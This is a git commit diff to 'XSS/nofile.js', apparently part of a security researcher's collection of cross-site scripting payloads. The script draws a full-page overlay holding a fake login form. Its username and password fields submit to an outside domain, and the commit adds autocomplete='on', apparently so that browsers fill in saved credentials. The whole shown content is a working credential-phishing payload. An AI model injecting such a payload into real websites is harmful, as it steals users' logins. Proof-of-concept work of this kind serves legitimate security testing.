9e90e3525cc9542fdcfac74fb05c545ed1102ded
Riccardo Malatesta <92185084+seeu-inspace@users.noreply.github.com>
2026-05-23 17:44:02 +0200

    Update nofile.js

--- XSS/nofile.js
+++ XSS/nofile.js
@@ -2,7 +2,7 @@
   var overlay = document.createElement('div');
   overlay.innerHTML = `
     <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#f6f8fa;display:flex;align-items:center;justify-content:center;z-index:999999;">
-      <form action="https://riccardomalatesta.com/" method="GET">
+      <form action="https://riccardomalatesta.com/" method="GET" autocomplete="on">
         <h2>Login</h2>
         <label>Username <input name="username" required></label>
         <label>Password <input type="password" name="password" required></label>
